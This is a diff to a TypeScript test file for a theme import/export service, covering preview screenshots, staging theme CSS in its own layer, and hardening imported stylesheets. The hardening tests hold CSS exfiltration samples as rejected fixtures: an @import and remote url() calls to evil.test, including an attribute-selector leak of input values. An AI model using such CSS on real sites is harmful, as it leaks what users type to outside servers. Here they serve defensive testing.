@@ -52,6 +52,9 @@ const appearance = {
   savedThemeTokens: null as unknown,
   savedCustomCss: null as unknown,
   savedInstalled: null as Record<string, unknown> | null,
+  /** The theme's OWN stylesheet layer — what an import stages, under the admin's. */
+  themeCustomCss: { light: "", dark: "" },
+  savedThemeCustomCss: null as { light: string; dark: string } | null,
 };
 
 vi.mock("../layouts/layout.service.js", () => ({
@@ -77,6 +80,10 @@ vi.mock("../appearance/appearance.service.js", () => ({
     getInstalledTheme:  async () => appearance.installed,
     saveThemeTokens:    async (t: unknown) => { appearance.savedThemeTokens = t; },
     saveCustomCss:      async (c: unknown) => { appearance.savedCustomCss = c; },
+    getThemeCustomCss:  async () => appearance.themeCustomCss,
+    saveThemeCustomCss: async (c: { light: string; dark: string }) => {
+      appearance.savedThemeCustomCss = c;
+    },
     setInstalledTheme:  async (m: Record<string, unknown>) => { appearance.savedInstalled = m; },
   },
 }));
@@ -123,6 +130,8 @@ beforeEach(async () => {
   appearance.savedThemeTokens = null;
   appearance.savedCustomCss = null;
   appearance.savedInstalled = null;
+  appearance.themeCustomCss = { light: "", dark: "" };
+  appearance.savedThemeCustomCss = null;
   await fs.rm(path.join(UPLOAD_DIR, "themes"), { recursive: true, force: true });
 });
 
@@ -204,6 +213,59 @@ describe("export", () => {
     expect(zip2.getEntry(THEME_PATHS.customDark)).toBeNull();
   });
 
+  /**
+   * The preview image. `screenshot` sat in the manifest schema unproduced for the
+   * whole life of the format; a marketplace listing with no picture is a theme
+   * nobody clicks, so the export is now the thing that fills it in.
+   */
+  describe("preview image", () => {
+    it("packs it as an asset and names it in the manifest", async () => {
+      const zip = new AdmZip(await themeService.exportTheme(META, { screenshot: PNG }));
+      expect(zip.getEntry(`${THEME_PATHS.assets}screenshot.png`)?.getData()).toEqual(PNG);
+      const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
+      expect(manifest.screenshot).toBe("assets/screenshot.png");
+    });
+
+    it("names no screenshot when none was given", async () => {
+      const zip = new AdmZip(await themeService.exportTheme(META));
+      const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
+      expect(manifest.screenshot).toBeUndefined();
+    });
+
+    /**
+     * The collision is silent otherwise: `addFile` twice under one name leaves
+     * whichever won, and the manifest would point at a page's hero image while the
+     * document lost the file it referenced.
+     */
+    it("keeps its name when a page image is also called screenshot.png", async () => {
+      await write("pages/screenshot.png", PNG);
+      published.templates.home = homeWithHero("pages/screenshot.png");
+
+      const zip = new AdmZip(await themeService.exportTheme(META, { screenshot: PNG }));
+      const doc = JSON.parse(zip.getEntry(`${THEME_PATHS.layouts}home.json`)!.getData().toString());
+      // The hero was renamed around the reserved name, and still resolves.
+      expect(heroImageOf(doc)).toBe("assets/2-screenshot.png");
+      expect(zip.getEntry(`${THEME_PATHS.assets}2-screenshot.png`)).not.toBeNull();
+
+      const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
+      expect(manifest.screenshot).toBe("assets/screenshot.png");
+    });
+
+    /** Rendered by a marketplace that did not build the package, so it holds the
+     *  same magic-byte rule an imported asset does — and SVG, the one image format
+     *  that can carry script, is not on the list. */
+    it("refuses anything that is not a real raster image", async () => {
+      await expect(themeService.exportTheme(META, { screenshot: Buffer.from("<svg/>") }))
+        .rejects.toThrow(/PNG, JPEG, WebP or AVIF/);
+    });
+
+    it("is packed even for a tokens-only palette, which carries no other assets", async () => {
+      const zip = new AdmZip(await themeService.exportTheme(META, { tokensOnly: true, screenshot: PNG }));
+      expect(zip.getEntry(`${THEME_PATHS.assets}screenshot.png`)).not.toBeNull();
+      expect(zip.getEntry(`${THEME_PATHS.layouts}home.json`)).toBeNull();
+    });
+  });
+
   it("records the distribution metadata a listing needs", async () => {
     const zip = new AdmZip(await themeService.exportTheme({
       ...META, license: "MIT", homepage: "https://example.com", authorUrl: "https://example.com/me",
@@ -244,6 +306,33 @@ describe("import", () => {
     expect(heroImageOf(staged)).toBe(`themes/${META.id}/hero.png`);
   });
 
+  /**
+   * The other half of the preview round trip. In a PACKAGE `screenshot` is
+   * package-relative; in the INSTALLED record it has to be this install's upload
+   * path, or the ACP renders a broken image — the same rewrite a document's image
+   * reference gets, for the same reason.
+   */
+  describe("preview image", () => {
+    it("repoints the stored manifest at where the image actually landed", async () => {
+      const exported = await themeService.exportTheme(META, { screenshot: PNG });
+      await themeService.importTheme(exported, "user-1");
+
+      expect(appearance.savedInstalled!.screenshot).toBe(`themes/${META.id}/screenshot.png`);
+      expect(await fs.readFile(path.join(UPLOAD_DIR, "themes", META.id, "screenshot.png"))).toEqual(PNG);
+    });
+
+    /** A theme may be pointing at a CDN. Blanking a value the package did not
+     *  carry a file for would break exactly that case. */
+    it("leaves a screenshot the package does not carry untouched", async () => {
+      const buf = pack(
+        { [THEME_PATHS.cssLight]: ":root { --c-bg: #fff; }" },
+        { screenshot: "https://cdn.example.com/shot.png" },
+      );
+      await themeService.importTheme(buf, "user-1");
+      expect(appearance.savedInstalled!.screenshot).toBe("https://cdn.example.com/shot.png");
+    });
+  });
+
   it("prefers tokens.json over the :root stylesheets", async () => {
     const buf = pack({
       [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#json" } }, dark: {} }),
@@ -265,12 +354,17 @@ describe("import", () => {
     await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/tokens\.json is invalid/);
   });
 
-  it("applies custom CSS live and says so", async () => {
+  it("stages custom CSS in the theme layer and says so", async () => {
+    // This used to assert the opposite — that the package's stylesheet went LIVE, into
+    // the admin's own keys. That was the bug: it overwrote whatever CSS the admin had
+    // written, with no baseline and nothing to recover from. See the theme-custom-CSS
+    // block at the bottom of this file for the rest of the behaviour.
     const report = await themeService.importTheme(
       pack({ [THEME_PATHS.customLight]: ".x { color: red; }" }), "user-1",
     );
     expect(report.customCssApplied).toBe(true);
-    expect(appearance.savedCustomCss).toEqual({ light: ".x { color: red; }", dark: "" });
+    expect(appearance.savedThemeCustomCss).toEqual({ light: ".x { color: red; }", dark: "" });
+    expect(appearance.savedCustomCss).toBeNull();
   });
 
   it("rejects custom CSS that does not parse, before anything is written", async () => {
@@ -629,5 +723,116 @@ describe("rejections are actionable", () => {
     const err = await rejectionOf(themeService.importTheme(zip.toBuffer(), "user-1"));
     expect(err.message).toContain("layouts/home.json");
     expect(err.message).toMatch(/main\.0/);   // the offending node, by path
+  });
+});
+
+// ── The theme's stylesheet: its own layer, staged, and hardened ──────────────
+//
+// Custom CSS was the one channel a theme did NOT layer. An import wrote the package's
+// stylesheet into the ADMIN's keys, so importing a theme destroyed whatever CSS the
+// admin had written — no baseline recorded, nowhere to recover it from. These assert
+// that it now lands in the theme's own layer instead, and that a stranger's stylesheet
+// cannot reach off-site or ship a reference the package does not carry.
+
+describe("theme custom CSS", () => {
+  const withCss = (files: Record<string, string | Buffer> = {}) =>
+    pack({ [THEME_PATHS.customLight]: ".x { color: red }", ...files });
+
+  it("stages into the THEME layer and never touches the admin's stylesheet", async () => {
+    appearance.customCss = { light: ".mine { color: blue }", dark: ".mine-dark { color: navy }" };
+
+    const report = await themeService.importTheme(withCss(), "user-1");
+
+    expect(report.customCssApplied).toBe(true);
+    expect(appearance.savedThemeCustomCss?.light).toContain(".x");
+    // The admin's own stylesheet is untouched — this is the whole point.
+    expect(appearance.savedCustomCss).toBeNull();
+    expect(appearance.customCss.light).toBe(".mine { color: blue }");
+  });
+
+  it("does NOT blank the admin's dark CSS when the package ships only light", async () => {
+    // The old code wrote both admin keys together, so a light-only package silently
+    // cleared the admin's dark stylesheet.
+    appearance.customCss = { light: "", dark: ".mine-dark { color: navy }" };
+    await themeService.importTheme(withCss(), "user-1");
+    expect(appearance.customCss.dark).toBe(".mine-dark { color: navy }");
+    expect(appearance.savedThemeCustomCss?.dark).toBe("");
+  });
+
+  it("rewrites url(assets/…) to where the file actually landed", async () => {
+    // Nothing did this before, so every image a theme shipped through its stylesheet
+    // resolved against /api/appearance/css and 404'd.
+    const buf = pack({
+      [THEME_PATHS.customLight]: `.hero { background: url("assets/tile.png") }`,
+      [`${THEME_PATHS.assets}tile.png`]: PNG,
+    });
+    await themeService.importTheme(buf, "user-1");
+    expect(appearance.savedThemeCustomCss?.light)
+      .toContain(`url("/uploads/themes/${META.id}/tile.png")`);
+  });
+
+  it("REFUSES @import — it fetches a stylesheet from another server", async () => {
+    const buf = withCss({ [THEME_PATHS.customLight]: `@import url("https://evil.test/x.css"); .a{color:red}` });
+    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/@import/);
+  });
+
+  it("REFUSES a remote url() — the exfiltration and fingerprinting vector", async () => {
+    for (const bad of [
+      `.a { background: url(https://evil.test/p.png) }`,
+      `.a { background: url("//evil.test/p.png") }`,
+      `input[value^="a"] { background: url('http://evil.test/a') }`,
+    ]) {
+      await expect(themeService.importTheme(withCss({ [THEME_PATHS.customLight]: bad }), "user-1"))
+        .rejects.toThrow(/another server/);
+    }
+  });
+
+  it("REFUSES a reference the package does not carry, naming it", async () => {
+    const err = await rejectionOf(themeService.importTheme(
+      withCss({ [THEME_PATHS.customLight]: `.a { background: url(assets/absent.png) }` }), "user-1",
+    ));
+    expect(err.message).toContain("assets/absent.png");
+    expect(err.message).toMatch(/does not carry/);
+  });
+
+  it("allows data: URLs and site-absolute paths — neither can reach off-site", async () => {
+    const css = `.a{background:url("data:image/gif;base64,R0lGODlhAQABAAAAACw=")}`
+      + `.b{background:url(/uploads/branding/logo.png)}`;
+    await themeService.importTheme(withCss({ [THEME_PATHS.customLight]: css }), "user-1");
+    expect(appearance.savedThemeCustomCss?.light).toContain("data:image/gif");
+    expect(appearance.savedThemeCustomCss?.light).toContain("/uploads/branding/logo.png");
+  });
+
+  it("refuses BEFORE writing anything — a rejected package leaves no assets on disk", async () => {
+    // All-or-nothing, the same rule the layouts and tokens follow.
+    const buf = pack({
+      [THEME_PATHS.customLight]: `.a { background: url(https://evil.test/p.png) }`,
+      [`${THEME_PATHS.assets}tile.png`]: PNG,
+    });
+    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow();
+    await expect(fs.readdir(path.join(UPLOAD_DIR, "themes", META.id))).rejects.toThrow();
+    expect(appearance.savedThemeCustomCss).toBeNull();
+  });
+
+  it("round-trips: export carries the stylesheet's images and repoints them", async () => {
+    // Without this an exported stylesheet points at the SOURCE site's uploads — a broken
+    // image everywhere else, and a package the importer would now refuse outright.
+    await write(`themes/${META.id}/tile.png`, PNG);
+    appearance.themeCustomCss = {
+      light: `.hero { background: url("/uploads/themes/${META.id}/tile.png") }`,
+      dark:  "",
+    };
+    appearance.customCss = { light: ".mine { color: blue }", dark: "" };
+
+    const zip = new AdmZip(await themeService.exportTheme(META));
+    const css = zip.getEntry(THEME_PATHS.customLight)!.getData().toString();
+
+    expect(css).toContain(`url("assets/tile.png")`);
+    expect(zip.getEntry(`${THEME_PATHS.assets}tile.png`)?.getData()).toEqual(PNG);
+    // EFFECTIVE, not the admin layer alone: the theme's half must travel too.
+    expect(css).toContain(".mine { color: blue }");
+
+    // And what it produced is accepted back.
+    await expect(themeService.importTheme(zip.toBuffer(), "user-1")).resolves.toBeTruthy();
   });
 });
